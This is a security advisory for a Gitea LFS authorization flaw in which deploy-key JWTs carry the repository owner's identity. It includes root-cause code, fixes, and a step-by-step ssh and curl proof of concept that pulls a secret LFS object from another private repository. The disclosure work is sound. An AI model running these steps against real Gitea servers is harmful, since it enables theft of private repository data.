# [M] Gitea LFS Deploy-Key Privilege Escalation

## Summary
Severity: Medium
Advisory: GHSA-rh79-75qm-gwjr
CVE: CVE-2026-58435
CWE: CWE-266, CWE-639
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-rh79-75qm-gwjr
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.27.0

## Details
## Vulnerability Header

| Field               | Value                                                       |
| ------------------- | ----------------------------------------------------------- |
| Vulnerability Title | Gitea LFS Deploy-Key Privilege Escalation                   |
| Severity Rating     | High                                                        |
| Bug Category        | Insufficient Authorization                                  |
| Location            | `services/lfs/server.go:268`, `routers/private/serv.go:275` |
| Affected Versions   | 1.25.5                                                      |

## Executive Summary

Gitea's LFS server (`services/lfs/server.go:268`) uses the `UserID` embedded in an LFS JWT to make cross-repository authorization decisions via `LFSObjectAccessible()`. This would be safe if the JWT `UserID` always matched the actual requesting principal — but for deploy keys, `routers/private/serv.go:275` sets `UserID = repo.OwnerID` instead of any identity representing the deploy key itself. As a result, an attacker who holds a write deploy key for any single repo owned by a victim can obtain a legitimate JWT (via the standard SSH `git-lfs-authenticate` flow) that Gitea will honor as if the victim themselves were making the request. The attacker can then exfiltrate LFS objects from any private repo the victim owns — no admin credentials, no server secrets, no brute force required. If the victim is a site administrator, every LFS object on the entire Gitea instance is reachable. Deploy keys exist precisely to grant narrow, single-repo access to CI/CD systems; this vulnerability defeats that isolation entirely for LFS data.

## Root Cause Analysis

### Technical Description

The vulnerability is a **trust-boundary confusion** across two independent subsystems. When a deploy key authenticates over SSH, `serv.go` sets `UserID = repo.OwnerID` because the code has no better representation for a deploy key identity (a `FIXME` comment acknowledges this). That `UserID` is baked verbatim into the LFS JWT by `cmd/serv.go`. The JWT is then consumed by `server.go`, which treats `claims.UserID` as the authenticated principal and loads that user object as `ctx.Doer`. When the batch upload handler encounters an object that exists on disk but isn't yet linked to the target repo, it calls `LFSObjectAccessible(ctx, ctx.Doer, oid)` — a global query across all repos the claimed user can see — to decide whether to silently create the cross-repo link. The JWT's `RepoID` claim is verified (so the request is correctly scoped to one repo at the HTTP level), but the `UserID` driving the cross-repo access decision is the repo *owner*, not the deploy key. The attacker ends up holding a valid, server-signed token that impersonates the victim for any LFS authorization check.

### First Faulty Condition

The primary bug — where the JWT `UserID` is set incorrectly — is in `serv.go`:

| File      | `routers/private/serv.go`                                                                         |
| --------- | ------------------------------------------------------------------------------------------------- |
| Line      | 275                                                                                               |
| Condition | Deploy key branch sets `results.UserID = repo.OwnerID`; the owner's UID is embedded in the JWT and later used as the authenticated principal for cross-repo privilege decisions in `server.go:268` |

```go
// routers/private/serv.go:252–278
if key.Type == asymkey_model.KeyTypeDeploy {
    ...
    // FIXME: Deploy keys aren't really the owner of the repo pushing changes
    // however we don't have good way of representing deploy keys in hook.go
    // so for now use the owner of the repository
    results.UserName = results.OwnerName
    results.UserID = repo.OwnerID    // ← OWNER's UID, not the deploy key
    ...
}
```

The secondary bug — where the tainted `UserID` is actually misused — is in `server.go`:

| File      | `services/lfs/server.go`                                                                                                                                         |
| --------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Line      | 268                                                                                                                                                              |
| Condition | `LFSObjectAccessible(ctx, ctx.Doer, oid)` makes a cross-repo decision using the JWT `UserID`, which for deploy keys is the repo owner, not the deploy key holder |

```go
// services/lfs/server.go:267–275
if exists && meta == nil {
    accessible, err := git_model.LFSObjectAccessible(ctx, ctx.Doer, p.Oid)
    ...
    if accessible {
        _, err := git_model.NewLFSMetaObject(ctx, repository.ID, p)  // links OID to attacker's repo
        ...
    }
}
```

**Admin amplification:** if `victim.IsAdmin`, `models/git/lfs.go:226` short-circuits with a bare `COUNT(*)` over the entire `lfs_meta_object` table — no repo filter. A deploy key on any admin-owned repo reaches every LFS object on the instance.

## Exploitability Assessment

### Attack Vector & Reachability

| Attack vector               | Network                                                                                            |
| --------------------------- | -------------------------------------------------------------------------------------------------- |
| Authentication required     | Low: attacker must hold a write deploy key's private key material for any of victim's repositories |
| User interaction required   | None                                                                                               |
| Reachable in default config | No. Requires `LFS_START_SERVER = true`                                                             |
| Entry point(s)              | SSH `git-lfs-authenticate` command + HTTP LFS batch API                                            |

The practical exploitability of this vulnerability is constrained by a second prerequisite that is independent of the authorization bypass itself: the attacker must know the SHA-256 OID of a specific LFS object in the target repository. OIDs are 256-bit digests — not enumerable and not brute-forceable — and the LFS batch endpoint functions only as an existence oracle, not a listing mechanism. Successful exploitation therefore requires a prior information-disclosure path that exposes OIDs outside the repository boundary. Known paths include public forks that retain stale LFS pointer files in git history, former collaborators who retained object references from a prior `git pull`, and issue or pull request comments that reference pointer file contents. 

LFS pointer files are committed in plaintext to git history, so anyone who ever cloned or had read access to the target repo retains all OIDs permanently. The attack is effectively a **post-revocation persistence** primitive — after a collaborator loses access, they can continue downloading updated versions of LFS files they previously knew existed.
### Reproduction Steps

**Environment**

The issue was reproduced using `gitea/gitea:1.25.5` docker image. 

**Setup** (performed as victim/admin — represents normal deployment state)

```bash
# 1. Victim creates a private repo and uploads an LFS object
git clone http://victim:PASSWORD@localhost:3000/victim/secret-repo.git
cd secret-repo
git lfs track "*.bin"
echo "TOP SECRET: password is hunter2" > secret.bin
git add .gitattributes secret.bin && git commit -m "secret"
git push && git lfs push origin main

# Note the OID and size from:
git lfs pointer --file=secret.bin
# oid sha256:1d4fed31944373fcc761b70a2efc4a9731bc3a007c63ecee22ccd5b93bb6483b
# size 32

# 2. Victim creates ci-repo and registers a write deploy key
#    (via UI: ci-repo → Settings → Deploy Keys → Add Deploy Key → enable write access)
#    Attacker holds the corresponding private key (e.g. leaked from CI config)
```

**Exploit**

```bash
# Step 1 — Obtain JWT via SSH using only the deploy key (no victim credentials)
ssh -i ~/.ssh/deploy_key -p 2222 git@localhost \
  "git-lfs-authenticate victim/ci-repo upload"
# → {"header":{"Authorization":"Bearer eyJ..."},"href":"..."}
# Decode payload: {"RepoID":3,"Op":"upload","UserID":4,...}
#                                              ^^^^^^^^ victim's UID — BUG

JWT="eyJ..."
OID="1d4fed31944373fcc761b70a2efc4a9731bc3a007c63ecee22ccd5b93bb6483b"
SIZE=32

# Step 2 — Confirm attacker is blocked from secret-repo directly
curl -s -H "Authorization: Bearer $JWT" \
  "http://localhost:3000/victim/secret-repo.git/info/lfs/objects/$OID"
# → {"Message":"Unauthorized"}  — correctly blocked

# Step 3 — Batch upload to ci-repo claiming the secret OID
curl -s -X POST \
  -H "Authorization: Bearer $JWT" \
  -H "Accept: application/vnd.git-lfs+json" \
  -H "Content-Type: application/vnd.git-lfs+json" \
  "http://localhost:3000/victim/ci-repo.git/info/lfs/objects/batch" \
  -d "{\"operation\":\"upload\",\"transfers\":[\"basic\"],\"objects\":[{\"oid\":\"$OID\",\"size\":$SIZE}]}"
# → {"objects":[{"oid":"1d4fed...","size":32}]}  — NO "actions" field
#   server silently linked the OID to ci-repo without demanding proof of possession

# Step 4 — Download the secret via ci-repo
curl -s -H "Authorization: Bearer $JWT" \
  "http://localhost:3000/victim/ci-repo.git/info/lfs/objects/$OID"
# → TOP SECRET: password is hunter2
```

**Expected output**

```
Step 2:  {"Message":"Unauthorized"}          ← blocked from secret-repo
Step 3:  {"objects":[{"oid":"1d4fed...","size":32}]}  ← no actions = silently linked
Step 4:  TOP SECRET: password is hunter2     ← exfiltrated via ci-repo
```

**PoC files**

- [poc.sh](https://github.com/user-attachments/files/28830752/poc.sh) — end-to-end PoC using real SSH deploy key

## Recommended Fix

A proper fix might require significant architecture change. A short term recommendation is presented below:

**Fix 1 — `services/lfs/server.go:267` (defense in depth, immediately effective)**

Remove the `LFSObjectAccessible` cross-repo shortcut. Require proof of possession (the normal upload flow) for any object not already linked to the target repo. The JWT is correctly scoped to one `RepoID`; authorization decisions about *other* repos should not be made using the JWT `UserID`.
```go
// BEFORE (vulnerable):
if exists && meta == nil {
    accessible, err := git_model.LFSObjectAccessible(ctx, ctx.Doer, p.Oid)
    if err != nil {
        log.Error("Unable to check if LFS MetaObject [%s] is accessible: %v", p.Oid, err)
        writeStatus(ctx, http.StatusInternalServerError)
        return
    }
    if accessible {
        _, err := git_model.NewLFSMetaObject(ctx, repository.ID, p)
        if err != nil {
            log.Error("Unable to create LFS MetaObject [%s] for %s/%s. Error: %v", p.Oid, rc.User, rc.Repo, err)
            writeStatus(ctx, http.StatusInternalServerError)
            return
        }
    } else {
        exists = false
    }
}
```

```go
// After (safe):
if exists && meta == nil {
    // Do not use ctx.Doer for cross-repo decisions — the JWT only authorizes
    // access to this repo. Always require proof-of-possession for objects
    // not already linked here.
    exists = false
}
```

The client will re-upload the bytes (which are hash-verified). 
Performance cost: one redundant upload per cross-repo object. Security gain: the cross-repo trust boundary is enforced regardless of how the JWT was issued.

Full patch: [fix1.patch](https://github.com/user-attachments/files/28830753/fix1.patch)

**Fix 2 — `routers/private/serv.go:275` (fix the source)**

Stop embedding `repo.OwnerID` in the JWT for deploy keys. Options:
- Add a `DeployKeyID` field to the JWT `Claims` struct; teach `handleLFSToken` to construct a minimal synthetic principal with exactly the deploy key's permissions (single-repo, mode-limited).
- Or mint a separate JWT type for deploy keys that `server.go` treats as repo-scoped only, refusing to use it for cross-repo operations.

Patch provenance: AI-generated + Human-reviewed

## Attribution

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by Adrian Denkiewicz at Doyensec in collaboration with Anthropic Research.

For CVE credits and public acknowledgments: Doyensec in collaboration with Claude and Anthropic Research.

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-rh79-75qm-gwjr
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.27.0
